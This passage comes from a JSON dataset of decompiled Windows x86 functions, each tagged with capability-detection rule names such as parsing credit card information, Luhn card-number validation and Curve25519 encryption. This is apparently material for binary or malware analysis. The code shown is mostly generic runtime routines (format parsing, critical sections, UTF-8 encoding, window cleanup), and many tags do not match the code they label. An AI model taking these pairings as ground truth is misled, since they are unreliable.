{\n            uVar9 = param_1[5];\n            iVar11 = 0;\n            do {\n                uVar12 = param_1[0x112];\n                if (*(uVar12 + 8) == *(uVar12 + 4)) {\n                    if (*(uVar12 + 0xc) == '\\0') {\n                        uVar9 = 0xffffffff;\n                    }\n                    else {\n                        uVar9 = uVar9 + 1;\n                    }\n                    param_1[5] = uVar9;\n                }\n                else {\n                    param_1[5] = uVar9 + 1;\n                    *(uVar12 + 8) = *(uVar12 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    *param_1[0x112] = *param_1[0x112] + 2;\n                }\n                uVar9 = param_1[5];\n                iVar10 = iVar19;\n            } while ((uVar9 != 0xffffffff) && (iVar11 = iVar11 + 1,  iVar11 < iVar13));\n        }\n        arg_10h = param_1 + 5;\n        fcn.0045592f(&stack0xfffffff0, iVar10, arg_10h);\n        ppiVar1 = param_1 + 0x112;\n        if (((param_1[7] >> 3 & 1) != 0) && (((param_1[7] >> 2 & 1) == 0 && (iVar10 = 0,  0 < iVar13)))) {\n            do {\n                piVar5 = *ppiVar1;\n                if (piVar5[2] == piVar5[1]) {\n                    if (*(piVar5 + 3) == '\\0') {\n                        uVar9 = 0xffffffff;\n                    }\n                    else {\n                        uVar9 = *arg_10h + 1;\n                    }\n                    *arg_10h = uVar9;\n                }\n                else {\n                    *arg_10h = *arg_10h + 1;\n                    piVar5[2] = piVar5[2] + 1;\n                    ***ppiVar1 = uVar16;\n                    **ppiVar1 = **ppiVar1 + 2;\n                }\n            } while ((*arg_10h != 0xffffffff) && (iVar10 = iVar10 + 1,  iVar10 < iVar13));\n        }\n        iVar10 = 0;\n        if ((*(param_1 + 0xe) == '\\0') && (0 < param_1[0xd])) {\n            uVar9 = param_1[2];\n            if (*(uVar9 + 0x14) == '\\0') {\n                fcn.00453bd0();\n            }\n            uVar12 = param_1[0xc];\n            uVar18 = 0;\n            if (param_1[0xd] != 0) {\n                do {\n                    uVar16 = 0;\n                    iVar19 = fcn.0045ee07(&stack0xffffffec, uVar12, *(*(uVar9 + 0xc) + 4), param_1[2]);\n                    ppiVar1 = param_1 + 0x112;\n                    if (iVar19 < 1) {\n                        *arg_10h = 0xffffffff;\n                        break;\n                    }\n                    piVar5 = *ppiVar1;\n                    if (piVar5[2] == piVar5[1]) {\n                        if (*(piVar5 + 3) == '\\0') {\n                            *arg_10h = 0xffffffff;\n                        }\n                        else {\n                            *arg_10h = *arg_10h + 1;\n                        }\n                    }\n                    else {\n                        *arg_10h = *arg_10h + 1;\n                        piVar5[2] = piVar5[2] + 1;\n                        ***ppiVar1 = uVar16;\n                        **ppiVar1 = **ppiVar1 + 2;\n                    }\n                    uVar12 = uVar12 + iVar19;\n                    uVar18 = uVar18 + 1;\n                } while (uVar18 != param_1[0xd]);\n            }\n        }\n        else {\n            fcn.0045592f(param_1[0xc], param_1[0xd], arg_10h);\n        }\n        uVar9 = *arg_10h;\n        if (((-1 < uVar9) && ((param_1[7] >> 2 & 1) != 0)) && (0 < iVar13)) {\n            do {\n                uVar12 = param_1[0x112];\n                if (*(uVar12 + 8) == *(uVar12 + 4)) {\n                    if (*(uVar12 + 0xc) == '\\0') {\n                        uVar9 = 0xffffffff;\n                    }\n                    else {\n                        uVar9 = uVar9 + 1;\n                    }\n                    *arg_10h = uVar9;\n                }\n                else {\n                    *arg_10h = uVar9 + 1;\n                    *(uVar12 + 8) = *(uVar12 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    piVar5 = param_1[0x112];\n                    *piVar5 = *piVar5 + 2;\n                }\n                uVar9 = *arg_10h;\n            } while ((uVar9 != 0xffffffff) && (iVar10 = iVar10 + 1,  iVar10 < iVar13));\n        }\n    }\ncode_r0x0044fb87:\n    uVar9 = fcn.004303e9(unaff_EBX);\n    return uVar9;\n}\n",
        "token_count": 3605
    },
    "0044d3eb": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044d3eb(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    int16_t iVar3;\n    uint16_t *puVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    bool bVar7;\n    char cVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint unaff_EBX;\n    uint16_t *puVar14;\n    ushort uVar15;\n    uint arg_8h;\n    ushort uVar16;\n    int16_t iVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    \n    uVar2 = *(param_1 + 0x2e);\n    puVar14 = uVar2;\n    if (puVar14 != 0x46) {\n        if (puVar14 == 0x4e) {\n            puVar14 = *param_1 & 8;\n            if (puVar14 != NULL) goto code_r0x0044d571;\n            *(param_1 + 6) = 8;\ncode_r0x0044d429:\n            uVar9 = param_1[2];\n            *(uVar9 + 0x1c) = 1;\n            *(uVar9 + 0x18) = 0x16;\n            uVar9 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar9 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044d429;\n        if (uVar2 < 0x6b) {\n            if (uVar2 == 0x6a) {\n                param_1[10] = 5;\n                goto code_r0x0044d571;\n            }\n            if (puVar14 == 0x49) {\n                puVar4 = param_1[3];\n                puVar14 = *puVar4;\n                if ((puVar14 == 0x33) && (puVar4[1] == 0x32)) {\n                    puVar14 = puVar4 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = puVar14;\n                }\n                else if (puVar14 == 0x36) {\n                    if (puVar4[1] == 0x34) {\n                        puVar14 = puVar4 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = puVar14;\n                    }\n                }\n                else if ((((puVar14 == 0x64) || (puVar14 == 0x69)) || (puVar14 == 0x6f)) ||\n                        (((puVar14 == 0x75 || (puVar14 == 0x78)) || (puVar14 == 0x58)))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044d571;\n            }\n            if (puVar14 == 0x4c) {\n                param_1[10] = 8;\n                goto code_r0x0044d571;\n            }\n            if (puVar14 == 0x54) {\n                param_1[10] = 0xd;\n                goto code_r0x0044d571;\n            }\n            if (uVar2 != 0x68) goto code_r0x0044d571;\n            if (*param_1[3] == 0x68) {\n                param_1[3] = param_1[3] + 1;\n                puVar14 = 0x1;\n            }\n            else {\n                puVar14 = 0x2;\n            }\n        }\n        else {\n            if (uVar2 != 0x6c) {\n                if (puVar14 == 0x74) {\n                    param_1[10] = 7;\n                }\n                else if (puVar14 == 0x77) {\n                    param_1[10] = 0xc;\n                }\n                else if (puVar14 == 0x7a) {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044d571;\n            }\n            if (*param_1[3] == 0x6c) {\n                param_1[3] = param_1[3] + 1;\n                puVar14 = 0x4;\n            }\n            else {\n                puVar14 = 0x3;\n            }\n        }\n        param_1[10] = puVar14;\ncode_r0x0044d571:\n        return CONCAT31(puVar14 >> 8, 1);\n    }\n    puVar14 = *param_1 & 8;\n    if (puVar14 != NULL) goto code_r0x0044d571;\n    *(param_1 + 6) = 7;\n    iVar17 = 0x41;\n    uVar2 = *(param_1 + 0x2e);\n    if (uVar2 < 0x65) {\n        if (uVar2 == 100) {\ncode_r0x0044fc56:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044fc5a:\n            cVar8 = fcn.00442f03(0);\n        }\n        else if (uVar2 < 0x54) {\n            if (uVar2 == 0x53) {\ncode_r0x0044fc83:\n                cVar8 = fcn.0045334c();\n            }\n            else {\n                if (uVar2 != 0x41) {\n                    if (uVar2 == 0x43) {\ncode_r0x0044fc10:\n                        cVar8 = fcn.004523b4(0);\n                        goto code_r0x0044fc93;\n                    }\n                    if (((uVar2 != 0x45) && (uVar2 != 0x46)) && (uVar2 != 0x47)) goto code_r0x0044ff7b;\n                }\ncode_r0x0044fbef:\n                cVar8 = fcn.00451a4d();\n            }\n        }\n        else if (uVar2 == 0x58) {\n            arg_8h = 1;\ncode_r0x0044fc25:\n            cVar8 = fcn.004441f7(arg_8h);\n        }\n        else {\n            if (uVar2 != 0x5a) {\n                if (uVar2 != 0x61) {\n                    if (uVar2 != 99) goto code_r0x0044ff7b;\n                    goto code_r0x0044fc10;\n                }\n                goto code_r0x0044fbef;\n            }\n            cVar8 = fcn.004507cd();\n        }\n    }\n    else if (uVar2 < 0x70) {\n        if (uVar2 == 0x6f) {\n            cVar8 = fcn.00452d07();\n        }\n        else {\n            if (((uVar2 == 0x65) || (uVar2 == 0x66)) || (uVar2 == 0x67)) goto code_r0x0044fbef;\n            if (uVar2 == 0x69) goto code_r0x0044fc56;\n            if (uVar2 != 0x6e) goto code_r0x0044ff7b;\n            cVar8 = fcn.00452b43();\n        }\n    }\n    else {\n        if (uVar2 != 0x70) {\n            if (uVar2 == 0x73) goto code_r0x0044fc83;\n            if (uVar2 != 0x75) {\n                if (uVar2 != 0x78) goto code_r0x0044ff7b;\n                arg_8h = 0;\n                goto code_r0x0044fc25;\n            }\n            goto code_r0x0044fc5a;\n        }\n        cVar8 = fcn.00452e16();\n    }\ncode_r0x0044fc93:\n    if ((cVar8 != '\\0') && (*(param_1 + 0xb) == '\\0')) {\n        iVar10 = 0;\n        iVar19 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar10 = 1;\n                    iVar19 = 1;\n                }\n            }\n            else {\n                iVar19 = 1;\n                iVar10 = 1;\n            }\n        }\n        iVar3 = *(param_1 + 0x2e);\n        if (((iVar3 != 0x78) && (iVar3 != 0x58)) || (bVar6 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar6 = false;\n        }\n        if ((iVar3 == 0x61) || (bVar7 = false,  iVar3 == iVar17)) {\n            bVar7 = true;\n        }\n        uVar16 = 0x30;\n        if ((bVar6) || (bVar7)) {\n            *(&stack0xfffffff0 + iVar10 * 2) = 0x30;\n            if ((iVar3 == 0x58) || (uVar15 = 0x78,  iVar3 == iVar17)) {\n                uVar15 = 0x58;\n            }\n            *(&stack0xfffffff2 + iVar10 * 2) = uVar15;\n            iVar10 = iVar10 + 2;\n            iVar19 = iVar10;\n        }\n        iVar13 = (param_1[8] - param_1[0xd]) - iVar10;\n        if (((*(param_1 + 7) & 0xc) == 0) && (0 < iVar13)) {\n            uVar9 = param_1[5];\n            iVar11 = 0;\n            do {\n                uVar12 = param_1[0x112];\n                if (*(uVar12 + 8) == *(uVar12 + 4)) {\n                    if (*(uVar12 + 0xc) == '\\0') {\n                        uVar9 = 0xffffffff;\n                    }\n                    else {\n                        uVar9 = uVar9 + 1;\n                    }\n                    param_1[5] = uVar9;\n                }\n                else {\n                    param_1[5] = uVar9 + 1;\n                    *(uVar12 + 8) = *(uVar12 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    *param_1[0x112] = *param_1[0x112] + 2;\n                }\n                uVar9 = param_1[5];\n                iVar10 = iVar19;\n            } while ((uVar9 != 0xffffffff) && (iVar11 = iVar11 + 1,  iVar11 < iVar13));\n        }\n        arg_10h = param_1 + 5;\n        fcn.0045592f(&stack0xfffffff0, iVar10, arg_10h);\n        ppiVar1 = param_1 + 0x112;\n        if (((param_1[7] >> 3 & 1) != 0) && (((param_1[7] >> 2 & 1) == 0 && (iVar10 = 0,  0 < iVar13)))) {\n            do {\n                piVar5 = *ppiVar1;\n                if (piVar5[2] == piVar5[1]) {\n                    if (*(piVar5 + 3) == '\\0') {\n                        uVar9 = 0xffffffff;\n                    }\n                    else {\n                        uVar9 = *arg_10h + 1;\n                    }\n                    *arg_10h = uVar9;\n                }\n                else {\n                    *arg_10h = *arg_10h + 1;\n                    piVar5[2] = piVar5[2] + 1;\n                    ***ppiVar1 = uVar16;\n                    **ppiVar1 = **ppiVar1 + 2;\n                }\n            } while ((*arg_10h != 0xffffffff) && (iVar10 = iVar10 + 1,  iVar10 < iVar13));\n        }\n        iVar10 = 0;\n        if ((*(param_1 + 0xe) == '\\0') && (0 < param_1[0xd])) {\n            uVar9 = param_1[2];\n            if (*(uVar9 + 0x14) == '\\0') {\n                fcn.00453bd0();\n            }\n            uVar12 = param_1[0xc];\n            uVar18 = 0;\n            if (param_1[0xd] != 0) {\n                do {\n                    uVar16 = 0;\n                    iVar19 = fcn.0045ee07(&stack0xffffffec, uVar12, *(*(uVar9 + 0xc) + 4), param_1[2]);\n                    ppiVar1 = param_1 + 0x112;\n                    if (iVar19 < 1) {\n                        *arg_10h = 0xffffffff;\n                        break;\n                    }\n                    piVar5 = *ppiVar1;\n                    if (piVar5[2] == piVar5[1]) {\n                        if (*(piVar5 + 3) == '\\0') {\n                            *arg_10h = 0xffffffff;\n                        }\n                        else {\n                            *arg_10h = *arg_10h + 1;\n                        }\n                    }\n                    else {\n                        *arg_10h = *arg_10h + 1;\n                        piVar5[2] = piVar5[2] + 1;\n                        ***ppiVar1 = uVar16;\n                        **ppiVar1 = **ppiVar1 + 2;\n                    }\n                    uVar12 = uVar12 + iVar19;\n                    uVar18 = uVar18 + 1;\n                } while (uVar18 != param_1[0xd]);\n            }\n        }\n        else {\n            fcn.0045592f(param_1[0xc], param_1[0xd], arg_10h);\n        }\n        uVar9 = *arg_10h;\n        if (((-1 < uVar9) && ((param_1[7] >> 2 & 1) != 0)) && (0 < iVar13)) {\n            do {\n                uVar12 = param_1[0x112];\n                if (*(uVar12 + 8) == *(uVar12 + 4)) {\n                    if (*(uVar12 + 0xc) == '\\0') {\n                        uVar9 = 0xffffffff;\n                    }\n                    else {\n                        uVar9 = uVar9 + 1;\n                    }\n                    *arg_10h = uVar9;\n                }\n                else {\n                    *arg_10h = uVar9 + 1;\n                    *(uVar12 + 8) = *(uVar12 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    piVar5 = param_1[0x112];\n                    *piVar5 = *piVar5 + 2;\n                }\n                uVar9 = *arg_10h;\n            } while ((uVar9 != 0xffffffff) && (iVar10 = iVar10 + 1,  iVar10 < iVar13));\n        }\n    }\ncode_r0x0044ff7b:\n    uVar9 = fcn.004303e9(unaff_EBX);\n    return uVar9;\n}\n",
        "token_count": 3570
    },
    "00464eb7": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00464eb7(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x6cd630));\n    return;\n}\n",
        "token_count": 69
    },
    "00464f6c": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00464f6c(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x6cd630));\n    return;\n}\n",
        "token_count": 71
    },
    "0046528e": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.0046528e(void)\n\n{\n    char in_AL;\n    uint32_t unaff_ESI;\n    \n    if (in_AL == '\\0') {\n        *(*((unaff_ESI >> 6) * 4 + 0x6cd630) + 0x28 + (unaff_ESI & 0x3f) * 0x38) =\n             *(*((unaff_ESI >> 6) * 4 + 0x6cd630) + 0x28 + (unaff_ESI & 0x3f) * 0x38) & 0xfe;\n    }\n    fcn.00464f6c(unaff_ESI);\n    return;\n}\n",
        "token_count": 155
    },
    "0046cc49": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046cc49(uint8_t *arg_8h, uint32_t arg_ch, uint32_t *arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if (arg_8h == NULL) {\n        arg_ch = 0;\n    }\n    else {\n        if (arg_ch != 0) {\n            if ((arg_ch & 0xffffff80) == 0) {\n                *arg_8h = arg_ch;\n                return 1;\n            }\n            if ((arg_ch & 0xfffff800) == 0) {\n                uVar3 = 0xc0;\n                iVar4 = 1;\n                iVar5 = iVar4;\n            }\n            else if ((arg_ch & 0xffff0000) == 0) {\n                if ((0xd7ff < arg_ch) && (arg_ch < 0xe000)) {\ncode_r0x0046cce8:\n                    uVar2 = fcn.0047168c(arg_10h, arg_14h);\n                    return uVar2;\n                }\n                iVar4 = 2;\n                uVar3 = 0xe0;\n                iVar5 = iVar4;\n            }\n            else {\n                if (((arg_ch & 0xffe00000) != 0) || (0x10ffff < arg_ch)) goto code_r0x0046cce8;\n                iVar4 = 3;\n                uVar3 = 0xf0;\n                iVar5 = iVar4;\n            }\n            do {\n                uVar1 = arg_ch;\n                arg_ch = arg_ch >> 6;\n                arg_8h[iVar4] = uVar1 & 0x3f | 0x80;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            *arg_8h = arg_ch | uVar3;\n            uVar2 = fcn.00471678(iVar5 + 1, arg_10h);\n            return uVar2;\n        }\n        *arg_8h = arg_ch;\n    }\n    *arg_10h = arg_ch;\n    arg_10h[1] = arg_ch;\n    return 1;\n}\n",
        "token_count": 509
    },
    "00471cb1": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00471cb1(uint32_t arg_8h, uint liDistanceToMove, uint lpNewFilePointer, uint arg_14h, int32_t arg_18h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint32_t dwMoveMethod;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.00465133(arg_8h);\n    if (iVar2 == -1) {\n        *(arg_18h + 0x1c) = 1;\n        *(arg_18h + 0x18) = 9;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)\n                          (iVar2, liDistanceToMove, lpNewFilePointer, &dwMoveMethod, arg_14h);\n        if (iVar2 == 0) {\n            arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.0043bc7e(arg_8h_00, arg_18h);\n        }\n        else if ((dwMoveMethod & var_4h) != 0xffffffff) {\n            puVar1 = *((arg_8h >> 6) * 4 + 0x6cd630) + 0x28 + (arg_8h & 0x3f) * 0x38;\n            *puVar1 = *puVar1 & 0xfd;\n            goto code_r0x00471d30;\n        }\n    }\n    dwMoveMethod = 0xffffffff;\n    var_4h = 0xffffffff;\ncode_r0x00471d30:\n    return CONCAT44(var_4h, dwMoveMethod);\n}\n",
        "token_count": 386
    },
    "00472a48": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00472a48(uint32_t arg_8h, int16_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t *piVar1;\n    uint8_t *puVar2;\n    int16_t iVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    int32_t iStack24;\n    uint var_4h;\n    \n    piVar1 = arg_ch + arg_10h;\n    piVar4 = arg_ch;\n    piVar5 = arg_ch;\n    piVar6 = arg_ch;\n    if (arg_ch < piVar1) {\n        do {\n            iVar3 = *piVar4;\n            if (iVar3 == 0x1a) {\n                puVar2 = *((arg_8h >> 6) * 4 + 0x6cd630) + 0x28 + (arg_8h & 0x3f) * 0x38;\n                *puVar2 = *puVar2 | 2;\n                piVar6 = piVar5;\n                break;\n            }\n            if (((iVar3 == 0xd) && (piVar4 + 1 < piVar1)) && (piVar4[1] == 10)) {\n                iStack24 = 4;\n                iVar3 = 10;\n            }\n            else {\n                iStack24 = 2;\n            }\n            piVar6 = piVar5 + 1;\n            *piVar5 = iVar3;\n            piVar4 = piVar4 + iStack24;\n            piVar5 = piVar6;\n        } while (piVar4 < piVar1);\n    }\n    return piVar6 - arg_ch & 0xfffffffe;\n}\n",
        "token_count": 393
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401000(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    int32_t in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    // [00] -r-x section size 499712 named .text\n    *0x4be004 = param_2;\n    *0x4be008 = &stack0x0000000c;\n    *0x4be000 = unaff_retaddr;\n    *0x4be00c = fcn.0042e8b0(param_1);\n    pcVar1 = fcn.0042e850(*(in_FS_OFFSET + 0xc0) != 0);\n    *0x4be010 = pcVar1;\n    *(*0x4be008 + -4) = 0x401058;\n    (*pcVar1)();\n    *(*0x4be008 + -4) = *0x4be004;\n    return;\n}\n",
        "token_count": 220
    },
    "00401a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401a50(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x5c));\n    if (iVar1 != 0) {\n        iVar1 = fcn.0042f7b3(*(param_1 + 0x6c));\n        iVar2 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(param_1 + 0x5c), 0xfffffffc);\n        if (iVar1 == iVar2) {\n            iVar1 = (*_sym.imp.USER32.dll_SetWindowLongW)(*(param_1 + 0x5c), 0xfffffffc, *(param_1 + 0x74));\n            if (iVar1 != 0) {\n                *(param_1 + 0x74) = _sym.imp.USER32.dll_DefWindowProcW;\n                *(param_1 + 0x5c) = 0;\n            }\n        }\n    }\n    if ((*(param_1 + 0x44) != 0) && ((*(param_1 + 0x58) & 2) == 0)) {\n        (*_sym.imp.USER32.dll_DestroyMenu)(*(param_1 + 0x44));\n    }\n    if (*(param_1 + 0x48) != 0) {\n        (*_sym.imp.COMCTL32.dll_ImageList_Destroy)(*(param_1 + 0x48));\n    }\n    if (*(param_1 + 0xb4) != 0) {\n        fcn.0043bd54(*(param_1 + 0xb4));\n        *(param_1 + 0xb4) = 0;\n    }\n    *(param_1 + 0xb8) = 0;\n    *(param_1 + 0xbc) = 0;\n    if (*(param_1 + 0xa4) != 0) {\n        iVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(*(param_1 + 0xa4));\n        if (iVar1 != 0) {\n            *(param_1 + 0xa4) = 0;\n        }\n    }\n    if (*(param_1 + 0x6c) != 0) {\n        fcn.0042f7fa(*(param_1 + 0x6c));\n    }\n    if (*(param_1 + 0x4c) != 0) {\n        fcn.0043bd54(*(param_1 + 0x4c));\n        *(param_1 + 0x4c) = 0;\n    }\n    *(param_1 + 0x50) = 0;\n    *(param_1 + 0x54) = 0;\n    if (*(param_1 + 0x34) != 0) {\n        fcn.0042f7fa(*(param_1 + 0x34));\n    }\n    if (*(param_1 + 0x14) != 0) {\n        fcn.0043bd54(*(param_1 + 0x14));\n        *(param_1 + 0x14) = 0;\n    }\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    if (*(param_1 + 8) != 0) {\n        fcn.0043bd54(*(param_1 + 8));\n        *(param_1 + 8) = 0;\n    }\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0xc) = 0;\n    return;\n}\n",
        "token_count": 812
    },
    "00401bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401bf0(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    \n    pcVar2 = _sym.imp.UxTheme.dll_EndBufferedPaint;\n    if (*(param_1 + 0xf0) != 0) {\n        (*_sym.imp.UxTheme.dll_EndBufferedPaint)(*(param_1 + 0xf0), 1);\n        *(param_1 + 0xf0) = 0;\n    }\n    cVar3 = fcn.00406560();\n    pcVar1 = _sym.imp.UxTheme.dll_BufferedPaintUnInit;\n    if (cVar3 != '\\0') {\n        (*_sym.imp.UxTheme.dll_BufferedPaintUnInit)();\n    }\n    if (*(param_1 + 0xe0) != 0) {\n        fcn.0042f7fa(*(param_1 + 0xe0));\n    }\n    if (*(param_1 + 0xb4) != 0) {\n        (*pcVar2)(*(param_1 + 0xb4), 1);\n        *(param_1 + 0xb4) = 0;\n    }\n    cVar3 = fcn.00406560();\n    if (cVar3 != '\\0') {\n        (*pcVar1)();\n    }\n    if (*(param_1 + 0xa4) != 0) {\n        fcn.0042f7fa(*(param_1 + 0xa4));\n    }\n    if (*(param_1 + 0x78) != 0) {\n        (*pcVar2)(*(param_1 + 0x78), 1);\n        *(param_1 + 0x78) = 0;\n    }\n    cVar3 = fcn.00406560();\n    if (cVar3 != '\\0') {\n        (*pcVar1)();\n    }\n    if (*(param_1 + 0x68) != 0) {\n        fcn.0042f7fa(*(param_1 + 0x68));\n    }\n    fcn.0042fb11(*(param_1 + 0x3c));\n    if (*(param_1 + 0x20) != 0) {\n        (*pcVar2)(*(param_1 + 0x20), 1);\n        *(param_1 + 0x20) = 0;\n    }\n    cVar3 = fcn.00406560();\n    if (cVar3 != '\\0') {\n        (*pcVar1)();\n    }\n    if (*(param_1 + 0x14) != 0) {\n        fcn.0042f7fa(*(param_1 + 0x14));\n    }\n    return;\n}\n",
        "token_count": 603
    },
    "00401ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401ce0(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(param_1 + 0x16c) != 0) {\n        iVar2 = (*_sym.imp.GDI32.dll_DeleteObject)(*(param_1 + 0x16c));\n        if (iVar2 != 0) {\n            *(param_1 + 0x16c) = 0;\n        }\n    }\n    fcn.00401a50();\n    if (*(param_1 + 0x9c) != 0) {\n        fcn.0042f7fa(*(param_1 + 0x9c));\n    }\n    fcn.00401e50();\n    fcn.0042fb11(*(param_1 + 0x50));\n    if (*(param_1 + 0x34) != 0) {\n        (*_sym.imp.UxTheme.dll_EndBufferedPaint)(*(param_1 + 0x34), 1);\n        *(param_1 + 0x34) = 0;\n    }\n    cVar1 = fcn.00406560();\n    if (cVar1 != '\\0') {\n        (*_sym.imp.UxTheme.dll_BufferedPaintUnInit)();\n    }\n    if (*(param_1 + 0x14) != 0) {\n        fcn.0042f7fa(*(param_1 + 0x14));\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "00401d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401d70(code **param_1)\n\n{\n    *param_1 = vtable.WTL::CMessageLoop.0;\n    if (param_1[4] != NULL) {\n        fcn.0043bd54(param_1[4]);\n        param_1[4] = NULL;\n    }\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    if (param_1[1] != NULL) {\n        fcn.0043bd54(param_1[1]);\n        param_1[1] = NULL;\n    }\n    param_1[3] = NULL;\n    param_1[2] = NULL;\n    return;\n}\n",
        "token_count": 157
    },
    "00401e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401e50(int32_t *param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    uint16_t *puVar3;\n    \n    piVar2 = param_1[3];\n    if ((piVar2 != NULL) && (puVar3 = param_1[4],  puVar3 != NULL)) {\n        iVar1 = *piVar2;\n        while (iVar1 != -1) {\n            if ((*puVar3 & 0x2000) != 0) {\n                fcn.0042fb11(*(puVar3 + 2));\n            }\n            piVar2 = piVar2 + 2;\n            puVar3 = puVar3 + 4;\n            iVar1 = *piVar2;\n        }\n        fcn.0042fb11(param_1[4]);\n    }\n    if (*param_1 != 0) {\n        fcn.0043bd54(*param_1);\n        *param_1 = 0;\n    }\n    param_1[2] = 0;\n    param_1[1] = 0;\n    return;\n}\n",
        "token_count": 253
    },
    "00402180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402180(ushort *arg_8h)\n\n{\n    ushort *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint32_t uVar5;\n    \n    iVar3 = in_ECX[2];\n    if (in_ECX[1] == iVar3) {\n        puVar1 = *in_ECX;\n        if ((puVar1 <= arg_8h) && (arg_8h < puVar1 + iVar3)) {\n            fcn.00402f30(0x80004005);\n            pcVar2 = swi(3);\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n        if (iVar3 == 0) {\n            uVar5 = 1;\n        }\n        else {\n            uVar5 = in_ECX[1] * 2;\n            if (uVar5 < 0) {\n                return 0;\n            }\n            if (0x3fffffff < uVar5) {\n                return 0;\n            }\n        }\n        iVar3 = fcn.0043bd7a(puVar1, uVar5, 2);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        in_ECX[2] = uVar5;\n        *in_ECX = iVar3;\n    }\n    puVar1 = *in_ECX + in_ECX[1] * 2;\n    if (puVar1 != NULL) {\n        *puVar1 = *arg_8h;\n    }\n    in_ECX[1] = in_ECX[1] + 1;\n    